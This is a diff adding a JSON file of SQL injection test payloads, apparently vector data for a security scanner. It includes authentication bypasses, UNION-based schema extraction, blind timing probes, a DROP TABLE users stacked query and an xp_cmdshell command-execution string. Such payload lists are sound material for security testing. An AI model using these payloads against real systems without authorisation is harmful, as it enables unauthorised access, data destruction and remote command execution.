@@ -1,0 +1,21 @@
+{
+  "category": "SQL Injection",
+  "cwe": "CWE-89",
+  "owasp": "A03:2021-Injection",
+  "description": "Standard OWASP & SecLists SQL Injection payloads for authentication bypass, error-based, union-based, and blind SQLi.",
+  "vectors": [
+    { "id": "SQLI-001", "name": "Basic Auth Bypass OR 1=1", "payload": "' OR '1'='1", "type": "auth_bypass", "risk": "critical" },
+    { "id": "SQLI-002", "name": "Commented Auth Bypass", "payload": "' OR 1=1--", "type": "auth_bypass", "risk": "critical" },
+    { "id": "SQLI-003", "name": "Admin Quote Bypass", "payload": "admin' --", "type": "auth_bypass", "risk": "critical" },
+    { "id": "SQLI-004", "name": "Admin Slash-Star Bypass", "payload": "admin' /*", "type": "auth_bypass", "risk": "critical" },
+    { "id": "SQLI-005", "name": "Union Select Null Test", "payload": "1' UNION SELECT NULL--", "type": "union_based", "risk": "high" },
+    { "id": "SQLI-006", "name": "Union Select Multi-Column", "payload": "' UNION ALL SELECT NULL,NULL,NULL--", "type": "union_based", "risk": "high" },
+    { "id": "SQLI-007", "name": "Stacked Query Drop Table", "payload": "'; DROP TABLE users--", "type": "stacked", "risk": "critical" },
+    { "id": "SQLI-008", "name": "MSSQL xp_cmdshell Execution", "payload": "'; EXEC xp_cmdshell('whoami')--", "type": "rce", "risk": "critical" },
+    { "id": "SQLI-009", "name": "Postgres Sleep Injection", "payload": "1'; SELECT pg_sleep(5)--", "type": "time_based_blind", "risk": "high" },
+    { "id": "SQLI-010", "name": "MySQL Sleep Injection", "payload": "1' AND SLEEP(5)--", "type": "time_based_blind", "risk": "high" },
+    { "id": "SQLI-011", "name": "SQLite Schema Extraction", "payload": "' UNION SELECT sql,2,3 FROM sqlite_master--", "type": "info_disclosure", "risk": "high" },
+    { "id": "SQLI-012", "name": "Boolean Blind True Test", "payload": "' AND 1=1--", "type": "boolean_blind", "risk": "medium" },
+    { "id": "SQLI-013", "name": "Boolean Blind False Test", "payload": "' AND 1=2--", "type": "boolean_blind", "risk": "medium" }
+  ]
+}
